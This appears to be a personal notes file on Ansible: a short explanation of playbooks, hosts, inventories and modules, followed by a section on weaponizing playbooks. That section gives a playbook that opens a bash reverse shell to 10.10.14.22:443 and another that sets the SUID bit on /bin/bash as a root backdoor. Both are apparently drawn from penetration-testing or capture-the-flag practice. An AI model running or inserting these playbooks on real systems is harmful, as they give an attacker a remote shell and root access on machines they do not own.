# ansible
## How does Ansible work?
- YAML config files
- `Playbooks`   An ordered list of tasks along with its necessary parameters that define a recipe to configure a system.
- `Host`        A remote machine managed by Ansible.
- `Group`       Several hosts grouped together that share a common attribute.
- `Inventory`   A collection of all the hosts and groups that Ansible manages.
Could be a static file in the simple cases or we can pull the inventory from remote sources, such as cloud providers.
- `Modules`     Units of code that Ansible sends to the remote nodes for execution.
- `Tasks`       Units of action that combine a module and its arguments along with some other parameters.
- `Roles`       Redistributable units of organization that allow users to share automation code easier.

Ansible uses the concepts of control and managed nodes.
It connects from the control node, any machine with Ansible installed, to the managed nodes sending commands and instructions to them.
The units of code that Ansible executes on the managed nodes are called modules.
Each module is invoked by a task, and an ordered list of tasks together forms a playbook.
Users write playbooks with tasks and modules to define the desired state of the system.
https://spacelift.io/blog/ansible-tutorial

## exploiting playbook
https://rioasmara.com/2022/03/21/ansible-playbook-weaponization/

### rev shell
```yaml
- hosts: localhost
  tasks:
  - name: rev
    shell: bash -c 'bash -i >& /dev/tcp/10.10.14.22/443 0>&1'
```

### priv esc backdoor
```yaml
- name: "whatever"
  hosts: localhost
  connection: local
  tasks:
    - name: "whatever"
      shell: "chmod +s /bin/bash"
      register: "output"
```
